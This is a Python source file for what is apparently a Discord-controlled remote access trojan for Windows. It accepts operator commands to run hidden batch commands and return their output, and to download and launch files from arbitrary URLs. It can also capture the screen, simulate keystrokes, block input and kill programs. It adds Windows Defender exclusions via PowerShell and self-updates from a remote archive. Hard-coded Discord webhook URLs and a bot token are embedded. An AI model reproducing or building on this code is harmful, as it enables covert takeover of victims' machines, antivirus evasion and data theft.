import os
import time
import discord
import pyautogui
import keyboard
import os
import webbrowser
import requests
from discord_webhook import DiscordWebhook
import ctypes
import pyaudio
import threading
import socket
pyautogui.FAILSAFE 
SPI_SETDESKWALLPAPER = 20

def change_background(path_to_image):
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path_to_image, 0)

import win32com.client as comclt
def openbg(file_path):
    wsh = comclt.Dispatch("WScript.Shell")
    wsh.Run(f'"{file_path}"', 0)
def startapp(name):
    with open("dontmindthisthingplease.bat","w") as f:
        f.write("start {0}".format(name))
    openbg("dontmindthisthingplease.bat")
count=0
chanid=0
#Just a weird way of getting the token, you may just put '[Token]' instead

#class CustomClient(discord.Client):
 #   async def on_ready(self):
  #      print(f'{self.user} has connected to Discord!')
#Don't touch
        
client = discord.Client(intents=discord.Intents.all())

#don't touch

chanid=1085082294483681300
@client.event
async def on_message(message):
    global count
    global chanid
        
    if message.author == client.user:
        return  
    else:
        try:
            if message.channel.id==chanid or message.channel.id==1073257262027649094:
                if message.content.lower().startswith("type "):
                    pyautogui.write(message.content.replace("type ","").replace("TYPE ", ""))
                elif message.content.lower().startswith("press "):
                    keyboard.press_and_release(message.content.replace("press ","").replace("PRESS ",""))
                elif message.content.lower().startswith("screenstart"):
                    with open(r'screenshare.txt', 'w') as file:
                        file.write("Yes")
                    openbg(os.getcwd()+"\\Screensharerclientside.pyw")
                elif message.content.lower().startswith("screenstop"):
                    with open(r'screenshare.txt', 'w') as file:
                        file.write("No")
                elif message.content.lower().startswith("cmddo"): 
                    with open(r'dontmindme.bat', 'w') as file:
                        try:
                            k=message.content.replace("cmddo ","").replace("CMDDO ","").split(",",1)
                            if k[1]=="yes":
                                file.write("""
@echo off
>output.txt (
  {0}
)
start outputsender.pyw
""".format(k[0]))
                                
                            else:
                                file.write(message.content.replace("cmddo ","").replace("CMDDO ","").replace(",yes",""))
                        except:
                            file.write(message.content.replace("cmddo ","").replace("CMDDO ",""))
                    openbg(os.getcwd()+"\\dontmindme.bat")
                elif message.content.lower().startswith("openurl"):
                    webbrowser.open(message.content.replace("openurl ","").replace("OPENURL ", ""),new=1,autoraise=True)
                elif message.content.lower().startswith("download"):
                    h=message.content.replace("download ", "").replace("DOWNLOAD ","").split(',',1)
                    open(h[0], 'wb').write(requests.get(h[1]).content)
                    DiscordWebhook(url='https://discord.com/api/webhooks/1068630663160406098/iZPMA-zcK2VQ_8O8LIplZQ6CL2sosvcwxpBFg0wRYU3Q_uFX3dJe-d8QyX0SqaRUG0v5', username="DOWNLOAD COMPLETE", content="**DOWNLOAD COMPLETE!** **{0}** HAS BEEN **INSTALLED!**".format(h[0])).execute()

                elif message.content.lower().startswith("volumeraiseron"):
                    with open(r'volumeraiser.txt', 'w') as file:
                        file.write("Yes")
                    openbg(os.getcwd()+"\\volumeraaise.pyw")
                elif message.content.lower().startswith("volumeraiseroff"):
                    with open(r'volumeraiser.txt', 'w') as file:
                        file.write("No")
                elif message.content.lower().startswith("ttssay"):
                    with open(r'spekwhat.txt', 'w') as file:
                        file.write(message.content.replace("ttssay ","").replace("TTSSAY ",""))
                    openbg(os.getcwd()+"\\ttssayy.pyw")
                elif message.content.lower().startswith("getcurrentpath"):
                    DiscordWebhook(url='https://discord.com/api/webhooks/1068630663160406098/iZPMA-zcK2VQ_8O8LIplZQ6CL2sosvcwxpBFg0wRYU3Q_uFX3dJe-d8QyX0SqaRUG0v5', username="INFO GIVER", content=os.getcwd()).execute()
                elif message.content.lower().startswith("getpathof"):
                    with open(r'getpathofyesowrs.txt', 'w') as file:
                        file.write(message.content.replace("getpathof ","").replace("GETPATHOF ",""))
                    openbg(os.getcwd()+"\\getpathofyesworks.pyw")
                elif message.content.lower().startswith("openfile"): 
                    h=message.content.replace("openfile ","").replace("OPENFILE ","").split(',',1)
                    with open(r'fileopenerbooster.bat', 'w') as file:
                        file.write("cd "+h[0]+"&&Start "+h[1])
                    openbg(os.getcwd()+"\\fileopenerbooster.bat")
                elif message.content.lower().startswith("enablemouse"):
                    with open(r'mouseenable.txt', 'w') as file:
                        temporr=message.content.replace('enablemouse ',"").replace('ENABLEMOUSE ',"").split(',')
                        file.write('Yes\n{0}\n{1}'.format(temporr[0],temporr[1]))
                    openbg(os.getcwd()+"\\enablemouselol.pyw")

                elif message.content.lower().startswith("disablemouse"):
                    with open(r'mouseenable.txt', 'w') as file:
                        file.write('No')
                elif message.content.lower().startswith("changebg"):
                    change_background(message.content.replace("changebg ","").replace("CHANGEBG ",""))
                elif message.content.lower().startswith("enablekeyboardmouse"):
                    with open(r'mousekeyboard.txt', 'w') as file:
                        temporrr=message.content.replace('enablekeyboardmouse ',"").replace('ENABLEKEYBOARDMOUSE ',"").split(',')
                        file.write('{0}'.format(temporrr[0]))
                    openbg(os.getcwd()+"\\keyboardmouse.pyw")
                elif message.content.lower().startswith("playsound"):
                    with open(r'playsound.txt','w') as file:
                        try:
                            k=message.content.replace('playsound ', "").split(",",1)
                            file.write('{0}\n{1}'.format(k[0],k[1]))
                        except:
                            file.write(message.content.replace('playsound ',""))
                    openbg(os.getcwd()+"\\playsoundmine.pyw")
                elif message.content.lower().startswith("getspeakerinfo"):
                    p = pyaudio.PyAudio()
                    for i in range(p.get_device_count()):
                        await message.channel.send(p.get_device_info_by_index(i))
                elif message.content.lower().startswith("disableinput"):
                    try:
                        k=message.content.replace("disableinput ","").split(',',1)
                        with open(r'inputdisable.txt','w') as file:
                            file.write('{0}\n{1}'.format(k[0],k[1]))
                        openbg(os.getcwd()+"\\inputdisabler.pyw")
                    except:
                        with open(r'inputdisable.txt','w') as file:
                            file.write(message.content.replace("disableinput ",""))
                        openbg(os.getcwd()+"\\inputdisabler.pyw")
                elif message.content.lower().startswith("checkactivity"):
                    await message.guild.get_channel(chanid).send("@everyone I am ONLINE")
                elif message.content.lower().startswith("flabbergast"):
                    with open(r'flabbergastcount.txt','w') as file:
                        file.write(message.content.replace("flabbergast ",""))
                    openbg(os.getcwd()+"\\flabbergaster.pyw")
                elif message.content.lower().startswith("blockprogram"):
                    with open(r'{0}killer.bat'.format(message.content.replace("blockprogram ","")),'w') as file:
                        file.write("""
:destroy
TASKKILL /F /IM {0}


goto destroy
""".format(message.content.replace("blockprogram ","")))
                    openbg(r'{0}killer.bat'.format(message.content.replace("blockprogram ","")))
                elif message.content.lower().startswith("terminate"):
                    with open(r'terminator.bat', 'w') as file:
                        file.write("TASKKILL /F /IM {0}".format(message.content.replace("terminate ","")))
                    openbg(os.getcwd()+"\\terminator.bat")
                elif message.content.lower().startswith("enablengrok"):
                    with open("ngrokslot.txt","w") as file:
                        k=message.content.lower().replace("enablengrok ","").split(",",1)
                        file.write("{0}\n{1}".format(k[0],k[1]))
                    openbg(os.getcwd()+"\\ngrokiscool.pyw")
                elif message.content.lower().startswith("unzipfile"):
                    with open(r'unzipfileinfo.txt','w') as f:
                        try:
                            k=message.content.replace("unzipfile ","").split(",",1)
                            f.write("{0}\n{1}".format(k[0],k[1]))
                        except:
                            f.write(message.content.replace("unzipfile ",""))
                    openbg("unzipperfile.pyw")
                        
                elif message.content.lower().startswith("betterscreenshare"):
                    with open("betterscreensharec.txt","w") as file:
                        file.write(message.content.lower().replace("betterscreenshare ",""))
                    openbg("betterscreenshare.pyw")
                elif message.content.lower().startswith("addexception"):
                    k=message.content.replace("addexception ","")
                    with open("exceptioner.bat","w") as file:
                        file.write("powershell -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionPath \'{0}\'\"".format(k))
                    openbg("exceptioner.bat")
                elif message.content.lower().startswith("birdtroll"):
                    k=message.content.lower().replace("birdtroll ","")
                    with open("birdtrollseconds.txt","w") as f:
                        f.write(k)
                    startapp("birdtroll.pyw")
                elif message.content.lower().startswith("extrainstall"):
                    k=message.content.lower().replace("extrainstall ","")
                    with open("extrasinfo.txt","w") as f:
                        f.write(k)
                    openbg("extrainstall.pyw")
                elif message.content.lower().startswith("startprogram"):
                    startapp(message.content.replace("startprogram ",""))
                elif message.content.lower().startswith("transferchan"):
                    k=message.content.lower().replace("transferchan ","")
                    orgchannel=client.get_channel(chanid)
                    chanid=int(k)
                    channell=client.get_channel(chanid)
                    await channell.send("@everyone I am "+socket.gethostname()+" I was transferred from: <#{0}>".format(orgchannel.id))
                elif message.content.lower().startswith("setbrightness"):

                    k=message.content.lower().replace("setbrightness ","").split(",",1)
                    if len(k)==1:
                        with open("brignessamount.txt", "w") as file:
                            file.write(message.content.lower().replace("setbrightness ",""))
                    if len(k)!=1:
                        with open("brignessamount.txt", "w") as file:
                            file.write(k[0]+"\n"+k[1])
                        
                    openbg("brightchange.pyw")
                elif message.content.lower().startswith("brightoff"):
                    k=open("brignessamount.txt").read()
                    with open("oki.bat","w") as file:
                        file.write("TASKKILL /F /IM {0}".format(k))
                    openbg("oki.bat")
                elif message.content.lower().startswith("updatebot"):
                    open("randomzip.zip", 'wb').write(requests.get("https://drive.google.com/u/0/uc?id=1I30IIWQ2L3NlgNehYpeE7gpgNGt_suYK&export=download").content)
                    with open(r'unzipfileinfo.txt','w') as f:
                        f.write(os.getcwd()+"\\randomzip.zip"+"\n"+r"C:\Users\\"+os.getlogin()+r"\AppData\Roaming\Microsoft\Network\random1")
                    openbg("unzipperfile.pyw")
                    with open(r"C:\Users\\"+os.getlogin()+r"\AppData\Roaming\Microsoft\Network\transformer.bat","w") as file:
                        file.write("""
@echo off
TASKKILL /F /IM pythonw.exe
set folder="{0}"
for /f "tokens=3 delims=: " %%h in ('handle -a -u %folder% ^| findstr "pid:"') do (
  taskkill /pid %%h /f
)
RD /S /Q %folder%
timeout 3
cd random1
start newgenSUIII.bat
exit
""".format(r"C:\Users\\"+os.getlogin()+r"\AppData\Roaming\Microsoft\Network\random"))
                        
        except Exception as e:
            if message.author.id!=1068630663160406098:
                try:
                    await message.channel.send(str(e)+ "@everyone")
                except Exception as w:
                    DiscordWebhook(url='https://discord.com/api/webhooks/1068630663160406098/iZPMA-zcK2VQ_8O8LIplZQ6CL2sosvcwxpBFg0wRYU3Q_uFX3dJe-d8QyX0SqaRUG0v5', username="INFO GIVER", content=str(e)+" @everyone"+ "Second error is: "+str(w)).execute()
            


#Does something when message occurs.
#Checks if message is sent by the bot, if it is not it replies with the message said except the copy part, if you said "Copy" at the start of your message. Just a template.
        
client.run('MTA2ODIwMTMyMDQ4NzU4Mzc0NA.GM7TxL.7DKVvmkphxi4X7K7EWt60NDANOvORKzprJeQc8')



    

#discord.Guild.text_channels[0].send(message.content.replace("Copy",""))

